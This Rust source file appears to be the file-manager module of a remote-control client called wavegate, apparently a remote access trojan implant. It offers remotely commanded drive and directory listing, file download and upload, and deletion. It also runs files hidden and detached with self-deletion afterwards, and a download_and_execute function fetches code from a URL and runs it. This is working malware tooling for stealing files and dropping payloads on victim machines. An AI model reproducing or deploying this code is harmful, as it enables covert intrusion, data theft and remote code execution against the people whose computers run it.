//! File manager operations for the client.

use std::fs::{self, File, Metadata};
use std::io::{Read, Write};
use std::path::Path;
use std::time::UNIX_EPOCH;

use wavegate_shared::{CommandResponseData, DirectoryEntry, DriveInfo};

/// Expand environment variables in a path (e.g., %USERPROFILE% -> C:\Users\Name)
fn expand_env_vars(path: &str) -> String {
    let mut result = path.to_string();

    // Find all %VAR% patterns and replace them
    while let Some(start) = result.find('%') {
        if let Some(end) = result[start + 1..].find('%') {
            let var_name = &result[start + 1..start + 1 + end];
            if let Ok(value) = std::env::var(var_name) {
                result = format!("{}{}{}", &result[..start], value, &result[start + 2 + end..]);
            } else {
                // If env var not found, skip this one
                break;
            }
        } else {
            break;
        }
    }

    result
}

/// List all available drives
pub fn list_drives() -> (bool, CommandResponseData) {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows::Win32::Storage::FileSystem::{
        GetDiskFreeSpaceExW, GetDriveTypeW, GetLogicalDrives,
    };
    use windows::core::PCWSTR;

    // Drive type constants (from Windows API)
    const DRIVE_REMOVABLE: u32 = 2;
    const DRIVE_FIXED: u32 = 3;
    const DRIVE_REMOTE: u32 = 4;
    const DRIVE_CDROM: u32 = 5;

    let mut drives = Vec::new();

    let mask = unsafe { GetLogicalDrives() };

    for i in 0..26u32 {
        if mask & (1 << i) != 0 {
            let letter = (b'A' + i as u8) as char;
            let path_str = format!("{}:\\", letter);
            let path_wide: Vec<u16> = OsStr::new(&path_str)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();

            let drive_type = unsafe { GetDriveTypeW(PCWSTR(path_wide.as_ptr())) };

            let drive_type_str = match drive_type {
                DRIVE_REMOVABLE => "Removable",
                DRIVE_FIXED => "Fixed",
                DRIVE_REMOTE => "Network",
                DRIVE_CDROM => "CD-ROM",
                _ => "Unknown",
            };

            // Get disk space
            let mut total_bytes: u64 = 0;
            let mut free_bytes: u64 = 0;

            unsafe {
                let mut free_caller: u64 = 0;
                let mut total: u64 = 0;
                let mut free: u64 = 0;

                if GetDiskFreeSpaceExW(
                    PCWSTR(path_wide.as_ptr()),
                    Some(&mut free_caller as *mut u64),
                    Some(&mut total as *mut u64),
                    Some(&mut free as *mut u64),
                ).is_ok() {
                    total_bytes = total;
                    free_bytes = free;
                }
            }

            drives.push(DriveInfo {
                name: path_str,
                total_bytes,
                free_bytes,
                fs_type: drive_type_str.to_string(),
            });
        }
    }

    (true, CommandResponseData::DrivesList { drives })
}

/// List contents of a directory
pub fn list_directory(path: &str) -> (bool, CommandResponseData) {
    let expanded = expand_env_vars(path);
    let path = Path::new(&expanded);

    if !path.exists() {
        return (false, CommandResponseData::Error {
            message: format!("Path does not exist: {}", path.display()),
        });
    }

    if !path.is_dir() {
        return (false, CommandResponseData::Error {
            message: format!("Path is not a directory: {}", path.display()),
        });
    }

    match fs::read_dir(path) {
        Ok(entries) => {
            let mut dir_entries = Vec::new();

            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();

                if let Ok(metadata) = entry.metadata() {
                    let (readonly, hidden) = get_file_attributes(&entry.path(), &metadata);

                    dir_entries.push(DirectoryEntry {
                        name,
                        is_dir: metadata.is_dir(),
                        size: if metadata.is_file() { metadata.len() } else { 0 },
                        modified: metadata.modified().ok()
                            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
                            .map(|d| d.as_secs()),
                        readonly,
                        hidden,
                    });
                }
            }

            // Sort: directories first, then files, both alphabetically
            dir_entries.sort_by(|a, b| {
                match (a.is_dir, b.is_dir) {
                    (true, false) => std::cmp::Ordering::Less,
                    (false, true) => std::cmp::Ordering::Greater,
                    _ => a.name.to_lowercase().cmp(&b.name.to_lowercase()),
                }
            });

            (true, CommandResponseData::DirectoryListing { entries: dir_entries })
        }
        Err(e) => (false, CommandResponseData::Error {
            message: format!("Failed to read directory: {}", e),
        }),
    }
}

/// Get file attributes (readonly, hidden)
fn get_file_attributes(path: &Path, _metadata: &Metadata) -> (bool, bool) {
    use std::os::windows::fs::MetadataExt;

    if let Ok(meta) = fs::metadata(path) {
        let attrs = meta.file_attributes();
        let readonly = attrs & 0x01 != 0;  // FILE_ATTRIBUTE_READONLY
        let hidden = attrs & 0x02 != 0;    // FILE_ATTRIBUTE_HIDDEN
        (readonly, hidden)
    } else {
        (false, false)
    }
}

/// Download a file (read and return its contents)
pub fn download_file(path: &str) -> (bool, CommandResponseData) {
    let path = Path::new(path);

    if !path.exists() {
        return (false, CommandResponseData::Error {
            message: format!("File does not exist: {}", path.display()),
        });
    }

    if !path.is_file() {
        return (false, CommandResponseData::Error {
            message: format!("Path is not a file: {}", path.display()),
        });
    }

    match File::open(path) {
        Ok(mut file) => {
            let mut data = Vec::new();
            match file.read_to_end(&mut data) {
                Ok(_) => (true, CommandResponseData::FileData { data }),
                Err(e) => (false, CommandResponseData::Error {
                    message: format!("Failed to read file: {}", e),
                }),
            }
        }
        Err(e) => (false, CommandResponseData::Error {
            message: format!("Failed to open file: {}", e),
        }),
    }
}

/// Upload a file (write data to path)
pub fn upload_file(path: &str, data: &[u8]) -> (bool, CommandResponseData) {
    let path = Path::new(path);

    // Create parent directories if they don't exist
    if let Some(parent) = path.parent() {
        if !parent.exists() {
            if let Err(e) = fs::create_dir_all(parent) {
                return (false, CommandResponseData::FileResult {
                    success: false,
                    error: Some(format!("Failed to create parent directories: {}", e)),
                });
            }
        }
    }

    match File::create(path) {
        Ok(mut file) => {
            match file.write_all(data) {
                Ok(_) => (true, CommandResponseData::FileResult {
                    success: true,
                    error: None,
                }),
                Err(e) => (false, CommandResponseData::FileResult {
                    success: false,
                    error: Some(format!("Failed to write file: {}", e)),
                }),
            }
        }
        Err(e) => (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Failed to create file: {}", e)),
        }),
    }
}

/// Delete a file or directory
pub fn delete_path(path: &str, recursive: bool) -> (bool, CommandResponseData) {
    let path = Path::new(path);

    if !path.exists() {
        return (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Path does not exist: {}", path.display())),
        });
    }

    let result = if path.is_dir() {
        if recursive {
            fs::remove_dir_all(path)
        } else {
            fs::remove_dir(path)
        }
    } else {
        fs::remove_file(path)
    };

    match result {
        Ok(_) => (true, CommandResponseData::FileResult {
            success: true,
            error: None,
        }),
        Err(e) => (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Failed to delete: {}", e)),
        }),
    }
}

/// Rename or move a file/directory
pub fn rename_path(old_path: &str, new_path: &str) -> (bool, CommandResponseData) {
    let old = Path::new(old_path);
    let new = Path::new(new_path);

    if !old.exists() {
        return (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Source path does not exist: {}", old.display())),
        });
    }

    match fs::rename(old, new) {
        Ok(_) => (true, CommandResponseData::FileResult {
            success: true,
            error: None,
        }),
        Err(e) => (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Failed to rename: {}", e)),
        }),
    }
}

/// Create a new directory
pub fn create_directory(path: &str) -> (bool, CommandResponseData) {
    let path = Path::new(path);

    if path.exists() {
        return (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Path already exists: {}", path.display())),
        });
    }

    match fs::create_dir_all(path) {
        Ok(_) => (true, CommandResponseData::FileResult {
            success: true,
            error: None,
        }),
        Err(e) => (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Failed to create directory: {}", e)),
        }),
    }
}

/// Copy a file or directory
pub fn copy_path(source: &str, destination: &str) -> (bool, CommandResponseData) {
    let src = Path::new(source);
    let dst = Path::new(destination);

    if !src.exists() {
        return (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Source does not exist: {}", src.display())),
        });
    }

    let result = if src.is_dir() {
        copy_dir_recursive(src, dst)
    } else {
        fs::copy(src, dst).map(|_| ())
    };

    match result {
        Ok(_) => (true, CommandResponseData::FileResult {
            success: true,
            error: None,
        }),
        Err(e) => (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Failed to copy: {}", e)),
        }),
    }
}

/// Recursively copy a directory
fn copy_dir_recursive(src: &Path, dst: &Path) -> std::io::Result<()> {
    fs::create_dir_all(dst)?;

    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());

        if src_path.is_dir() {
            copy_dir_recursive(&src_path, &dst_path)?;
        } else {
            fs::copy(&src_path, &dst_path)?;
        }
    }

    Ok(())
}

/// Execute/open a file with its default handler
pub fn execute_file(path: &str, args: Option<&str>, _hidden: bool, delete_after: bool, independent: bool) -> (bool, CommandResponseData) {
    use std::os::windows::process::CommandExt;

    const CREATE_NO_WINDOW: u32 = 0x08000000;
    const DETACHED_PROCESS: u32 = 0x00000008;
    const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;

    let path = Path::new(path);

    if !path.exists() {
        return (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("File does not exist: {}", path.display())),
        });
    }

    // Use cmd /c start to open any file with its default handler (like double-click)
    let mut cmd = std::process::Command::new("cmd");
    cmd.args(["/c", "start", "", &path.to_string_lossy()]);

    if let Some(args_str) = args {
        cmd.args(args_str.split_whitespace());
    }

    // Set creation flags based on independent mode
    if independent {
        cmd.creation_flags(CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP);
    } else {
        cmd.creation_flags(CREATE_NO_WINDOW);
    }

    match cmd.spawn() {
        Ok(child) => {
            // If delete_after is set, spawn watchdog thread to delete file after process exits
            // Note: for independent processes, we can't track when they exit, so just delay delete
            if delete_after {
                let path_owned = path.to_path_buf();
                if independent {
                    std::thread::spawn(move || {
                        delete_after_run(path_owned, None);
                    });
                } else {
                    std::thread::spawn(move || {
                        delete_after_run(path_owned, Some(child));
                    });
                }
            }
            (true, CommandResponseData::FileResult {
                success: true,
                error: None,
            })
        }
        Err(e) => (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Failed to execute: {}", e)),
        }),
    }
}

/// Watchdog to delete file after process exits
fn delete_after_run(path: std::path::PathBuf, child: Option<std::process::Child>) {
    use std::time::Duration;

    // Try immediate delete first (in case process detached quickly)
    std::thread::sleep(Duration::from_millis(500));
    if std::fs::remove_file(&path).is_ok() {
        return;
    }

    // Wait for process to exit if we have a handle
    if let Some(mut child) = child {
        // Wait up to 5 minutes for process to exit
        for _ in 0..300 {
            match child.try_wait() {
                Ok(Some(_)) => {
                    // Process exited, delete the file
                    std::thread::sleep(Duration::from_millis(100));
                    let _ = std::fs::remove_file(&path);
                    return;
                }
                Ok(None) => {
                    // Still running, wait a bit
                    std::thread::sleep(Duration::from_secs(1));
                }
                Err(_) => break,
            }
        }
    }

    // Final attempt after timeout
    let _ = std::fs::remove_file(&path);
}

/// Download a file from URL and execute it
pub fn download_and_execute(url: &str, path: &str, args: Option<&str>, hidden: bool, delete_after: bool, independent: bool) -> (bool, CommandResponseData) {
    // Download the file using ureq
    let response = match ureq::get(url).call() {
        Ok(resp) => resp,
        Err(e) => {
            return (false, CommandResponseData::FileResult {
                success: false,
                error: Some(format!("Failed to download: {}", e)),
            });
        }
    };

    if response.status() >= 400 {
        return (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Download failed with status: {}", response.status())),
        });
    }

    let mut bytes = Vec::new();
    if let Err(e) = response.into_reader().read_to_end(&mut bytes) {
        return (false, CommandResponseData::FileResult {
            success: false,
            error: Some(format!("Failed to read response body: {}", e)),
        });
    }

    // Write to the destination path
    let dest_path = Path::new(path);
    if let Some(parent) = dest_path.parent() {
        if !parent.exists() {
            if let Err(e) = fs::create_dir_all(parent) {
                return (false, CommandResponseData::FileResult {
                    success: false,
                    error: Some(format!("Failed to create directory: {}", e)),
                });
            }
        }
    }

    match File::create(dest_path) {
        Ok(mut file) => {
            if let Err(e) = file.write_all(&bytes) {
                return (false, CommandResponseData::FileResult {
                    success: false,
                    error: Some(format!("Failed to write file: {}", e)),
                });
            }
        }
        Err(e) => {
            return (false, CommandResponseData::FileResult {
                success: false,
                error: Some(format!("Failed to create file: {}", e)),
            });
        }
    }

    // Now execute the downloaded file
    execute_file(path, args, hidden, delete_after, independent)
}
